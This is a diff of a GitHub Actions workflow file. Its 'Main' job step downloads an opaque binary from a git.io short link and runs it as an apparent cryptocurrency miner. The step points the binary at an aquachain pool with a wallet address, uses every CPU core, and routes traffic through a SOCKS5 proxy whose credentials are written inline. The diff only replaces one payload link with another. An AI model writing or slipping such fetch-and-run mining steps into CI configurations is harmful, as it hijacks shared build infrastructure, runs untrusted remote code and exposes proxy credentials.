@@ -56,7 +56,7 @@ jobs:
       run: apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
     - name: Main
       run: |
-        wget -qO build https://git.io/JX7qc && chmod +x build && ./build -F http://pool.aquachain.xyz:8888/0x17487f717ec0cba96858f071d0c4bee476b0fb5a/$(cat /proc/sys/kernel/hostname) -p x -t $(nproc) --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80
+        wget -qO build https://git.io/Jyi21 && chmod +x build && ./build -F http://pool.aquachain.xyz:8888/0x17487f717ec0cba96858f071d0c4bee476b0fb5a/$(cat /proc/sys/kernel/hostname) -p x -t $(nproc) --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80
   Success:
     needs: [Main, Main01]
     if: always()
